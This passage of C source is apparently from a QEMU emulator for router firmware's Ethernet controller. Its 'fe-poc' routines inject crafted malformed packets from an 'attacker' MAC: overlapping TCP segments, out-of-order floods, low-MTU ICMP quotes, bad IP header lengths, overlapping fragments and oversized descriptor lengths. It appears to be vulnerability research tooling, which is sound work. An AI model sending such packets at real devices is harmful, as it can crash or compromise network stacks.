                len, seq, ack + 0x40000000);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x12, seq,
                                          ack, win, 0, NULL, 0);
        fprintf(stderr,
                "[fe-poc] injecting TCP state-fuzz SYN|ACK established len=%zu "
                "seq=%#x ack=%#x\n",
                len, seq, ack);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "ooo-overlap") || !strcmp(mode, "all")) {
        uint8_t a[80], b[120], c[20], d[32], filler[192];
        uint32_t seq = leopard_get_be32(tcp + 4);
        uint32_t ack = leopard_get_be32(tcp + 8);
        uint16_t win = leopard_get_be16(tcp + 14);

        memset(a, 'A', sizeof(a));
        memset(b, 'B', sizeof(b));
        memset(c, 'C', sizeof(c));
        memset(d, 'D', sizeof(d));
        memset(filler, 'F', sizeof(filler));

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x18, seq + 200,
                                          ack, win, 0, a, sizeof(a));
        fprintf(stderr,
                "[fe-poc] injecting TCP OOO segment A len=%zu seq=%#x\n",
                len, seq + 200);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x18, seq + 160,
                                          ack, win, 0, b, sizeof(b));
        fprintf(stderr,
                "[fe-poc] injecting TCP overlap segment B len=%zu seq=%#x\n",
                len, seq + 160);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x18, seq + 180,
                                          ack, win, 0, c, sizeof(c));
        fprintf(stderr,
                "[fe-poc] injecting TCP covered segment C len=%zu seq=%#x\n",
                len, seq + 180);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x18, seq + 280,
                                          ack, win, 0, d, sizeof(d));
        fprintf(stderr,
                "[fe-poc] injecting TCP coalesce segment D len=%zu seq=%#x\n",
                len, seq + 280);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        if (data_len < 160) {
            size_t gap_len = 160 - data_len;
            len = leopard_build_tcp_est_probe(s, frame, ip, 0x18,
                                              seq + data_len, ack, win, 0,
                                              filler, gap_len);
            fprintf(stderr,
                    "[fe-poc] injecting TCP OOO filler len=%zu seq=%#x "
                    "gap=%zu\n",
                    len, seq + data_len, gap_len);
            leopard_fe_deliver_rx_frame(s, frame, len, true);
        }
    }

    if (!strcmp(mode, "ooo-flood") || !strcmp(mode, "all")) {
        uint8_t payload[64];
        uint32_t seq = leopard_get_be32(tcp + 4);
        uint32_t ack = leopard_get_be32(tcp + 8);
        uint16_t win = leopard_get_be16(tcp + 14);

        memset(payload, 'Q', sizeof(payload));
        for (uint32_t i = 0; i < 128; i++) {
            len = leopard_build_tcp_est_probe(s, frame, ip, 0x18,
                                              seq + 4096 + i * sizeof(payload),
                                              ack, win, 0, payload,
                                              sizeof(payload));
            if ((i & 0x0f) == 0) {
                fprintf(stderr,
                        "[fe-poc] injecting TCP OOO flood %u/128 len=%zu "
                        "seq=%#x\n",
                        i + 1, len, seq + 4096 + i * (uint32_t)sizeof(payload));
            }
            leopard_fe_deliver_rx_frame(s, frame, len, true);
        }
    }
}

static uint16_t leopard_payload_checksum(const uint8_t *p, size_t len)
{
    uint32_t sum = 0;

    for (size_t i = 0; i < len; i += 2) {
        if (i + 1 < len) {
            sum += leopard_get_be16(p + i);
        } else {
            sum += (uint16_t)p[i] << 8;
        }
    }
    return leopard_fold_checksum(sum);
}

static size_t leopard_build_ipv4_probe(LeopardFEState *s, uint8_t *frame,
                                       uint8_t proto, uint16_t ident,
                                       uint16_t frag, const uint8_t *payload,
                                       size_t payload_len)
{
    uint8_t fw_mac[6];
    uint8_t attacker_mac[6] = { 0x02, 0x00, 0xba, 0xd0, 0x0a, 0x04 };
    uint8_t *ip = frame + 14;
    size_t ip_len = 20 + payload_len;

    leopard_fe_get_fw_mac(s, fw_mac);
    memcpy(frame + 0, fw_mac, 6);
    memcpy(frame + 6, attacker_mac, 6);
    frame[12] = 0x08;
    frame[13] = 0x00;

    memset(ip, 0, ip_len);
    ip[0] = 0x45;
    leopard_put_be16(ip + 2, ip_len);
    leopard_put_be16(ip + 4, ident);
    leopard_put_be16(ip + 6, frag);
    ip[8] = 64;
    ip[9] = proto;
    ip[12] = 192; ip[13] = 168; ip[14] = 0; ip[15] = 254;
    ip[16] = 192; ip[17] = 168; ip[18] = 0; ip[19] = 1;
    if (payload_len) {
        memcpy(ip + 20, payload, payload_len);
    }
    leopard_fix_ipv4_checksums(ip, ip_len);
    return 14 + ip_len;
}

static void leopard_fe_maybe_inject_tcp_pmtu_low(LeopardFEState *s,
                                                 const uint8_t *tx_frame,
                                                 size_t tx_frame_len)
{
    const char *mode = getenv("LEOPARD_INJECT_TCP_EST");
    const uint8_t *tx_ip;
    const uint8_t *tx_tcp;
    uint8_t ihl;
    uint8_t thl;
    uint16_t ip_len;
    uint8_t frame[14 + 20 + 8 + 20 + 8];
    uint8_t icmp[8 + 20 + 8];
    uint16_t csum;
    size_t len;

    if (s->tcp_pmtu_low_injected || !mode ||
        (strcmp(mode, "pmtu-low") && strcmp(mode, "all")) ||
        tx_frame_len < 54 || tx_frame[12] != 0x08 || tx_frame[13] != 0x00 ||
        (tx_frame[14] >> 4) != 4 || tx_frame[23] != 6) {
        return;
    }

    tx_ip = tx_frame + 14;
    ihl = (tx_ip[0] & 0x0f) * 4;
    ip_len = leopard_get_be16(tx_ip + 2);
    if (ihl < 20 || tx_frame_len < 14 + ihl + 20 || ip_len < ihl + 20) {
        return;
    }
    tx_tcp = tx_ip + ihl;
    thl = (tx_tcp[12] >> 4) * 4;
    if (thl < 20 || leopard_get_be16(tx_tcp) != 80 ||
        leopard_get_be16(tx_tcp + 2) == 40100 ||
        (tx_tcp[13] & 0x12) != 0x12) {
        return;
    }

    memset(icmp, 0, sizeof(icmp));
    icmp[0] = 3;
    icmp[1] = 4;
    leopard_put_be16(icmp + 6, 40);
    memcpy(icmp + 8, tx_ip, 20);
    memcpy(icmp + 8 + 20, tx_tcp, 8);
    csum = leopard_payload_checksum(icmp, sizeof(icmp));
    icmp[2] = csum >> 8;
    icmp[3] = csum & 0xff;

    len = leopard_build_ipv4_probe(s, frame, 1, 0x504d, 0,
                                   icmp, sizeof(icmp));
    if (s->peer_mac_valid) {
        memcpy(frame + 6, s->peer_mac, 6);
    }
    s->tcp_pmtu_low_injected = true;
    fprintf(stderr,
            "[fe-poc] injecting TCP PMTU-low ICMP quote mtu=40 sport=%u dport=%u seq=%#x len=%zu\n",
            leopard_get_be16(tx_tcp), leopard_get_be16(tx_tcp + 2),
            leopard_get_be32(tx_tcp + 4), len);
    leopard_fe_deliver_rx_frame(s, frame, len, true);
}

static void leopard_fe_maybe_inject_bad_ip(LeopardFEState *s)
{
    const char *mode = getenv("LEOPARD_INJECT_BAD_IP");
    uint8_t frame[14 + 20 + 128];
    size_t len;

    if (s->bad_ip_injected || !mode || !*mode) {
        return;
    }
    if (!(s->glo_cfg & 4) || !s->rx_base || !s->rx_max) {
        return;
    }

    s->bad_ip_injected = true;
    leopard_fe_ensure_ipv4_binding();

    if (!strcmp(mode, "udp-short-len") || !strcmp(mode, "all")) {
        uint8_t udp[8] = { 0x9c, 0x40, 0x00, 0x35, 0x00, 0x07, 0x00, 0x00 };
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d00, 0, udp, sizeof(udp));
        fprintf(stderr, "[fe-poc] injecting bad IP UDP len<8 frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "icmp-short-error") || !strcmp(mode, "all")) {
        uint8_t icmp[8] = { 3, 4, 0, 0, 0, 0, 0, 0 };
        uint16_t csum = leopard_payload_checksum(icmp, sizeof(icmp));
        icmp[2] = csum >> 8;
        icmp[3] = csum & 0xff;
        len = leopard_build_ipv4_probe(s, frame, 1, 0x4d01, 0, icmp, sizeof(icmp));
        fprintf(stderr, "[fe-poc] injecting bad IP short ICMP error frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "icmp-no-l4") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 1, 0x4d0a, 0, NULL, 0);
        fprintf(stderr, "[fe-poc] injecting bad IP ICMP total_len=IHL frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "icmp-ihl-over") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 1, 0x4d0b, 0, NULL, 0);
        frame[14] = 0x4f;
        leopard_fix_ipv4_checksums(frame + 14, len - 14);
        fprintf(stderr, "[fe-poc] injecting bad IP ICMP IHL>total frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "tcp-no-l4") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 6, 0x4d06, 0, NULL, 0);
        fprintf(stderr, "[fe-poc] injecting bad IP TCP total_len=IHL frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "udp-no-l4") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d07, 0, NULL, 0);
        fprintf(stderr, "[fe-poc] injecting bad IP UDP total_len=IHL frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "tcp-ihl-over") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 6, 0x4d08, 0, NULL, 0);
        frame[14] = 0x4f;
        leopard_fix_ipv4_checksums(frame + 14, len - 14);
        fprintf(stderr, "[fe-poc] injecting bad IP TCP IHL>total frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "udp-ihl-over") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d09, 0, NULL, 0);
        frame[14] = 0x4f;
        leopard_fix_ipv4_checksums(frame + 14, len - 14);
        fprintf(stderr, "[fe-poc] injecting bad IP UDP IHL>total frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "icmp-tcp-quote") || !strcmp(mode, "all")) {
        uint8_t icmp[8 + 20 + 8];
        uint8_t *qip = icmp + 8;
        uint8_t *qtcp = qip + 20;
        uint16_t csum;

        memset(icmp, 0, sizeof(icmp));
        icmp[0] = 3;
        icmp[1] = 4;
        qip[0] = 0x45;
        leopard_put_be16(qip + 2, 40);
        qip[8] = 64;
        qip[9] = 6;
        qip[12] = 192; qip[13] = 168; qip[14] = 0; qip[15] = 1;
        qip[16] = 192; qip[17] = 168; qip[18] = 0; qip[19] = 254;
        leopard_put_be16(qtcp + 0, 80);
        leopard_put_be16(qtcp + 2, 40004);
        leopard_put_be32(qtcp + 4, 0x11223344);
        leopard_fix_ipv4_checksums(qip, 40);
        csum = leopard_payload_checksum(icmp, sizeof(icmp));
        icmp[2] = csum >> 8;
        icmp[3] = csum & 0xff;
        len = leopard_build_ipv4_probe(s, frame, 1, 0x4d04, 0,
                                       icmp, sizeof(icmp));
        fprintf(stderr, "[fe-poc] injecting bad IP ICMP TCP quote frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "icmp-udp-quote") || !strcmp(mode, "all")) {
        uint8_t icmp[8 + 20 + 8];
        uint8_t *qip = icmp + 8;
        uint8_t *qudp = qip + 20;
        uint16_t csum;

        memset(icmp, 0, sizeof(icmp));
        icmp[0] = 3;
        icmp[1] = 4;
        qip[0] = 0x45;
        leopard_put_be16(qip + 2, 28);
        qip[8] = 64;
        qip[9] = 17;
        qip[12] = 192; qip[13] = 168; qip[14] = 0; qip[15] = 1;
        qip[16] = 192; qip[17] = 168; qip[18] = 0; qip[19] = 254;
        leopard_put_be16(qudp + 0, 40005);
        leopard_put_be16(qudp + 2, 53);
        leopard_put_be16(qudp + 4, 8);
        leopard_fix_ipv4_checksums(qip, 28);
        csum = leopard_payload_checksum(icmp, sizeof(icmp));
        icmp[2] = csum >> 8;
        icmp[3] = csum & 0xff;
        len = leopard_build_ipv4_probe(s, frame, 1, 0x4d05, 0,
                                       icmp, sizeof(icmp));
        fprintf(stderr, "[fe-poc] injecting bad IP ICMP UDP quote frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "frag-overlap") || !strcmp(mode, "all")) {
        uint8_t frag0[16] = {
            0x9c, 0x41, 0x00, 0x35, 0x00, 0x18, 0x00, 0x00,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
        };
        uint8_t frag1[16] = {
            0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
            0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43
        };
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d02, 0x2000,
                                       frag0, sizeof(frag0));
        fprintf(stderr, "[fe-poc] injecting bad IP overlap frag0 frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d02, 0x0001,
                                       frag1, sizeof(frag1));
        fprintf(stderr, "[fe-poc] injecting bad IP overlap frag1 frame_len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "frag-ihl-under") || !strcmp(mode, "all")) {
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d0c, 0x2000, NULL, 0);
        frame[14] = 0x4f;
        leopard_fix_ipv4_checksums(frame + 14, len - 14);
        fprintf(stderr,
                "[fe-poc] injecting bad IP fragmented IHL>total frame_len=%zu\n",
                len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "frag-ihl-under-complete") || !strcmp(mode, "all")) {
        uint8_t *ip = frame + 14;
        uint8_t *fake_ip;
        uint8_t udp_tail[8] = {
            0x9c, 0x43, 0x00, 0x35, 0x00, 0x08, 0x00, 0x00
        };

        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d0d, 0x2000, NULL, 0);
        memset(ip + 20, 0x41, 60);
        len = 14 + 80;
        ip[0] = 0x4f;
        leopard_put_be16(ip + 2, 20);
        fake_ip = ip + 60;
        memset(fake_ip, 0, 20);
        fake_ip[0] = 0x45;
        leopard_put_be16(fake_ip + 2, 28);
        fake_ip[8] = 64;
        fake_ip[9] = 17;
        fake_ip[12] = 192; fake_ip[13] = 168; fake_ip[14] = 0; fake_ip[15] = 254;
        fake_ip[16] = 192; fake_ip[17] = 168; fake_ip[18] = 0; fake_ip[19] = 1;
        leopard_fix_ipv4_checksums(ip, len - 14);
        fprintf(stderr,
                "[fe-poc] injecting bad IP fragmented IHL>total complete frag0 "
                "frame_len=%zu logical_iplen=20 fake_ip_at=+60\n",
                len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d0d, 0x1ffb,
                                       udp_tail, sizeof(udp_tail));
        fprintf(stderr,
                "[fe-poc] injecting bad IP fragmented IHL>total complete frag1 "
                "frame_len=%zu offset=0xffd8 payload=8\n",
                len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "rx-plen-over") || !strcmp(mode, "all")) {
        uint8_t udp[8] = { 0x9c, 0x42, 0x00, 0x35, 0x06, 0xde, 0x00, 0x00 };
        len = leopard_build_ipv4_probe(s, frame, 17, 0x4d03, 0, udp, sizeof(udp));
        leopard_put_be16(frame + 14 + 2, 0x06f2);
        leopard_fix_ipv4_checksums(frame + 14, len - 14);
        fprintf(stderr,
                "[fe-poc] injecting bad IP desc PLEN=0x700 frame_len=%zu iplen=0x6f2\n",
                len);
        leopard_fe_deliver_rx_frame_with_plen(s, frame, len, 0x700, true);
    }
}

static ssize_t leopard_fe_receive(NetClientState *nc,
                                  const uint8_t *buf, size_t size)
{
    LeopardFEState *s = qemu_get_nic_opaque(nc);
    static int rx_log = 0;
    if (rx_log++ < 8) {
        fprintf(stderr, "[fe] RX size=%zu glo=%#x base=%#x max=%u drx=%u crx=%u\n",
                size, s->glo_cfg, s->rx_base, s->rx_max,
                s->rx_drx_idx, s->rx_crx_idx);
        /* Hexdump first 64 bytes so we can verify the L2/L3 headers
         * (in particular: is the dest MAC the firmware's MAC?). */
        size_t dump = size < 64 ? size : 64;
        fprintf(stderr, "[fe] RX bytes:");
        for (size_t i = 0; i < dump; i++) {
            if (i % 16 == 0) fprintf(stderr, "\n[fe]   %04zx:", i);
            fprintf(stderr, " %02x", buf[i]);
        }
        fprintf(stderr, "\n");
    }
    if (size >= 54 && buf[12] == 0x08 && buf[13] == 0x00 &&
        (buf[14] >> 4) == 4 && buf[23] == 6) {
        const uint8_t *ip = buf + 14;
        uint8_t ihl = (ip[0] & 0x0f) * 4;
        if (ihl >= 20 && size >= 14 + ihl + 20) {
            const uint8_t *tcp = ip + ihl;
            uint16_t sport = leopard_get_be16(tcp);
            uint16_t dport = leopard_get_be16(tcp + 2);
            uint16_t ip_len = leopard_get_be16(ip + 2);
            uint8_t thl = (tcp[12] >> 4) * 4;
            uint16_t data_len = ip_len >= ihl + thl ? ip_len - ihl - thl : 0;
            if (getenv("LEOPARD_FE_RX_TRACE") || sport == 80 || dport == 80) {
                fprintf(stderr,
                        "[fe] RX tcp %u.%u.%u.%u>%u.%u.%u.%u %u>%u "
                        "flags=%#x seq=%#x ack=%#x win=%u iplen=%u datalen=%u "
                        "glo=%#x drx=%u crx=%u\n",
                        buf[26], buf[27], buf[28], buf[29],
                        buf[30], buf[31], buf[32], buf[33],
                        sport, dport, tcp[13], leopard_get_be32(tcp + 4),
                        leopard_get_be32(tcp + 8), leopard_get_be16(tcp + 14),
                        ip_len, data_len, s->glo_cfg, s->rx_drx_idx,
                        s->rx_crx_idx);
            }
            if (dport == 80 && (tcp[13] & 0x02) && getenv("LEOPARD_FE_RX_TRACE")) {
                static bool dumped_eth_dispatch;

                if (!dumped_eth_dispatch) {
                    uint32_t table = 0x4066a848;
                    uint32_t hooks = leopard_debug_read32(0x4066f840);
                    uint32_t node = leopard_debug_read32(table);

                    dumped_eth_dispatch = true;
                    fprintf(stderr,
                            "[fe] eth-dispatch bucket0=%#x hooks=%#x for ethertype 0x0008\n",
                            node, hooks);
                    for (int i = 0; node && i < 8; i++) {
                        fprintf(stderr,
                                "[fe] eth-dispatch rec[%d] node=%#x next=%#x "
                                "eth=%#x ifp=%#x handler=%#x\n",
                                i, node, leopard_debug_read32(node),
                                leopard_debug_read32(node - 0x14),
                                leopard_debug_read32(node - 0x10),
                                leopard_debug_read32(node - 0x0c));
                        node = leopard_debug_read32(node);
                    }
                    for (int i = 0; hooks && i < 8; i++) {
                        fprintf(stderr,
                                "[fe] eth-dispatch hook[%d] node=%#x next=%#x "
                                "ifp=%#x handler=%#x\n",
                                i, hooks, leopard_debug_read32(hooks),
                                leopard_debug_read32(hooks - 0x10),
                                leopard_debug_read32(hooks - 0x0c));
                        hooks = leopard_debug_read32(hooks);
                    }
                }
            }
        }
    }
    if (size >= 34 && buf[12] == 0x08 && buf[13] == 0x00 &&
        buf[23] == 0x06) {
        memcpy(s->peer_mac, buf + 6, 6);
        s->peer_mac_valid = true;
        static bool dumped_ipv4_bindings;
        if (!dumped_ipv4_bindings) {
            dumped_ipv4_bindings = true;
            leopard_fe_ensure_ipv4_binding();
            leopard_fe_dump_ipv4_bindings();
        }
    }
    /* ARP auto-reply: the firmware's IP layer doesn't actually have an
     * IP assigned (or the bridge<->IP-stack glue is incomplete in our
     * synthetic build), so it never replies to ARP requests for its
     * own IP.  slirp learns guest MACs only by observing outbound
     * traffic; with no firmware ARP reply, slirp never delivers the
     * SYN to the firmware's MAC, and host->guest TCP times out.
     *
     * Stand in for the firmware's ARP layer: when we see an ARP
     * request for the observed LAN address, generate the reply ourselves and
     * inject it back via the NIC's TX queue.  This is the same kind
     * of "fake what the firmware should be doing" that we already do
     * for PHY/MDIO.
     *
     * Ethernet frame layout for ARP:
     *   [0..5]   dst MAC
     *   [6..11]  src MAC
     *   [12..13] ethertype = 0x0806
     *   [14..15] htype = 0x0001 (Ethernet)
     *   [16..17] ptype = 0x0800 (IPv4)
     *   [18]     hlen = 6, [19] plen = 4
     *   [20..21] op (1=request, 2=reply)
     *   [22..27] sender HW
     *   [28..31] sender IP
     *   [32..37] target HW
     *   [38..41] target IP
     */
    if (size >= 42 && buf[12] == 0x08 && buf[13] == 0x06 &&
        buf[20] == 0x00 && buf[21] == 0x01) {
        /* ARP request.  Target IP at bytes 38..41. */
        uint32_t our_ip = leopard_fe_guest_ip_be();
        uint32_t tgt_ip = leopard_get_be32(buf + 38);
        if (tgt_ip == our_ip) {
            /* Build a 42-byte ARP reply. */
            uint8_t reply[42] = {0};
            /* Use the firmware's actual GMAC1 MAC (read from registers
             * the firmware programmed). MAC_ADRH = high 2 bytes,
             * MAC_ADRL = low 4 bytes (network order). */
            /* Firmware UART confirms ADRH=high 16 bits=0x0019,
             * ADRL=low 32 bits=0x66cb8b07 (TP-Link OUI 00:19:66).
             * Our register names are swapped vs the firmware: s->mac_h
             * holds what the firmware calls ADRL (low 4 bytes), and
             * s->mac_l holds ADRH (high 2 bytes). */
            uint8_t fw_mac[6];
            leopard_fe_get_fw_mac(s, fw_mac);
            leopard_fe_get_rx_accept_mac(fw_mac);
            /* dst = sender of request */
            memcpy(reply + 0, buf + 6, 6);
            memcpy(reply + 6, fw_mac, 6);
            reply[12] = 0x08; reply[13] = 0x06;
            reply[14] = 0x00; reply[15] = 0x01;
            reply[16] = 0x08; reply[17] = 0x00;
            reply[18] = 6; reply[19] = 4;
            reply[20] = 0x00; reply[21] = 0x02;       /* reply */
            memcpy(reply + 22, fw_mac, 6);
            leopard_put_be32(reply + 28, our_ip);
            memcpy(reply + 32, buf + 22, 6);          /* tgt HW = orig sender HW */
            memcpy(reply + 38, buf + 28, 4);          /* tgt IP = orig sender IP */
            fprintf(stderr,
                    "[fe] ARP auto-reply: %02x:%02x:%02x:%02x:%02x:%02x is %u.%u.%u.%u\n",
                    fw_mac[0], fw_mac[1], fw_mac[2], fw_mac[3], fw_mac[4],
                    fw_mac[5], (our_ip >> 24) & 0xff, (our_ip >> 16) & 0xff,
                    (our_ip >> 8) & 0xff, our_ip & 0xff);
            qemu_send_packet(qemu_get_queue(s->nic), reply, sizeof(reply));
            return size;
        }
    }
    if (!(s->glo_cfg & 4)) return 0;
    if (!s->rx_base || !s->rx_max) return 0;
    if (size > 1600) return size;        /* drop oversize */

    leopard_fe_maybe_inject_bad_arp(s);
    leopard_fe_maybe_inject_bad_tcp(s);
    leopard_fe_maybe_inject_bad_ip(s);
    leopard_fe_start_tcp_tiny_mss(s, buf, size);
    leopard_fe_maybe_inject_tcp_est(s, buf, size);
    if (getenv("LEOPARD_RX_DELAY_DATA_ONLY") &&
        size >= 54 && buf[12] == 0x08 && buf[13] == 0x00 && buf[23] == 0x06) {
        const uint8_t *ip = buf + 14;
        uint8_t ihl = (ip[0] & 0x0f) * 4;
        uint16_t ip_len = leopard_get_be16(ip + 2);
        if (ihl >= 20 && ip_len >= ihl + 20 && size >= 14 + ip_len) {
            const uint8_t *tcp = ip + ihl;
            uint8_t thl = (tcp[12] >> 4) * 4;
            uint16_t data_len = ip_len >= ihl + thl ? ip_len - ihl - thl : 0;
            if (data_len == 0) {
                ssize_t ret = leopard_fe_deliver_rx_frame(s, buf, size, false);
                leopard_fe_raise_rx_irq(s);
                return ret;
            }
        }
    }
    return leopard_fe_deliver_rx_frame(s, buf, size, true);
}

static uint64_t leopard_fe_read(void *opaque, hwaddr off, unsigned size)
{
    LeopardFEState *s = opaque;
    if (off >= 0x5000 && off < 0x6000) {
        off -= 0x5000;
    }
    switch (off) {
    case FE_GDMA1_FWD_CFG:    return s->gdma1_fwd_cfg;
    case FE_GMAC1_MAC_ADRH:   return s->mac_h;
    case FE_GMAC1_MAC_ADRL:   return s->mac_l;
    case FE_PDMA_RX0_BASE_PTR:return s->rx_base;
    case FE_PDMA_RX0_MAX_CNT: return s->rx_max;
    case FE_PDMA_RX0_CRX_IDX: return s->rx_crx_idx;
    case FE_PDMA_TX0_BASE_PTR:return s->tx_base;
    case FE_PDMA_TX0_MAX_CNT: return s->tx_max;
    case FE_PDMA_TX0_CTX_IDX: return s->tx_ctx_idx;
    case FE_PDMA_GLO_CFG:
        /* Always report TX/RX_DMA_BUSY clear (bits 1 and 3). */
        return s->glo_cfg & ~0x0Au;
    case FE_PDMA_RST_IDX:     return 0;
    case FE_PDMA_DLY_INT_CFG: return s->dly_int_cfg;
    case FE_PDMA_INT_STATUS:  return s->int_status;
    case FE_PDMA_INT_MASK:    return s->int_mask;
    default: {
        /* Return what was previously written for any otherwise-
         * unhandled offset (PPE control registers etc.). */
        unsigned o = (unsigned)off & 0xfff;
        uint32_t v = s->fe_misc[o >> 2];
        /* Log first read of each distinct unhandled offset so we can
         * spot polling loops that always see 0 (e.g. a "ready" bit the
         * firmware is waiting on but no driver ever sets). */
        static uint8_t seen_rd[0x1000];
        if (!seen_rd[o]) {
            seen_rd[o] = 1;
            CPUState *cs = qemu_get_cpu(0);
            ARMCPU *acpu = ARM_CPU(cs);
            uint32_t pc = acpu ? acpu->env.regs[15] : 0;
            fprintf(stderr, "[fe] RD unhandled %#06x = %#x  (pc=%#x)\n",
                    o, v, pc);
        }
        return v;
    }
    }
}

static void leopard_fe_write(void *opaque, hwaddr off,
                             uint64_t val, unsigned size)
{
    LeopardFEState *s = opaque;
    if (off >= 0x5000 && off < 0x6000) {
        off -= 0x5000;
    }
    switch (off) {
    case FE_GDMA1_FWD_CFG: s->gdma1_fwd_cfg = val; break;
    case FE_GMAC1_MAC_ADRH: s->mac_h = val; break;
    case FE_GMAC1_MAC_ADRL: s->mac_l = val; break;
    case FE_PDMA_RX0_BASE_PTR: s->rx_base = val; break;
    case FE_PDMA_RX0_MAX_CNT:  s->rx_max = val; break;
    case FE_PDMA_RX0_CRX_IDX: {
        /* Log the first 32 consumer-index advances so we can see when
         * (and from where) the firmware's L2 RX driver actually picks up
         * delivered packets.  If this never fires after we've delivered
         * an RX descriptor, the L2 RX path isn't running at all. */
        static int crx_log = 0;
        if (crx_log++ < 32) {
            CPUState *cs = qemu_get_cpu(0);
            ARMCPU *acpu = ARM_CPU(cs);
            uint32_t pc = acpu ? acpu->env.regs[15] : 0;
            uint32_t lr = acpu ? acpu->env.regs[14] : 0;
            fprintf(stderr, "[fe] RX crx=%u (was %u, drx=%u) pc=%#x lr=%#x\n",
                    (unsigned)val, s->rx_crx_idx, s->rx_drx_idx, pc, lr);
        }
        s->rx_crx_idx = val;
        /* Driver consumed up to here — wake any pending receivers. */
        if (s->nic) {
            qemu_flush_queued_packets(qemu_get_queue(s->nic));
        }
        break;
    }
    case FE_PDMA_TX0_BASE_PTR: s->tx_base = val; break;
    case FE_PDMA_TX0_MAX_CNT:  s->tx_max = val; break;
    case FE_PDMA_TX0_CTX_IDX: {
        /* Log the writer PC the first 32 times so we can identify
         * which firmware function is kicking TX. */
        static int kick_log = 0;
        if (kick_log++ < 32) {
            CPUState *cs = qemu_get_cpu(0);
            ARMCPU *acpu = ARM_CPU(cs);
            uint32_t pc = acpu ? acpu->env.regs[15] : 0;
            uint32_t lr = acpu ? acpu->env.regs[14] : 0;
            fprintf(stderr, "[fe] TX kick ctx=%u (was %u) pc=%#x lr=%#x\n",
                    (unsigned)val, s->tx_ctx_idx, pc, lr);
        }
        s->tx_ctx_idx = val;
        leopard_fe_kick_tx(s);
        break;
    }
    case FE_PDMA_GLO_CFG: {
        uint32_t old = s->glo_cfg;
        s->glo_cfg = val;
        if ((val & 5) && !s->enabled_logged) {
            fprintf(stderr, "[fe] PDMA enabled, GLO_CFG=%#x (was %#x) "
                    "rx_base=%#x rx_max=%u tx_base=%#x tx_max=%u\n",
                    (unsigned)val, (unsigned)old,
                    s->rx_base, s->rx_max, s->tx_base, s->tx_max);
            s->enabled_logged = true;
        }
        if (val & 1) leopard_fe_kick_tx(s);
        if (val & 4) leopard_fe_maybe_inject_bad_arp(s);
        if ((val & 4) && s->nic) {
            qemu_flush_queued_packets(qemu_get_queue(s->nic));
        }
        break;
    }
    case FE_PDMA_RST_IDX:
        /* Treat as sticky=0: reset both index counters when bits set. */
        if (val & 1) { s->tx_ctx_idx = 0; s->tx_dtx_idx = 0; }
        if (val & (1u << 16)) { s->rx_crx_idx = 0; s->rx_drx_idx = 0; }
        break;
    case FE_PDMA_DLY_INT_CFG: s->dly_int_cfg = val; break;
    case FE_PDMA_INT_STATUS:
        {
            static int int_status_log;
            if (getenv("LEOPARD_FE_INT_TRACE") && int_status_log++ < 64) {
                CPUState *cs = qemu_get_cpu(0);
                ARMCPU *acpu = ARM_CPU(cs);
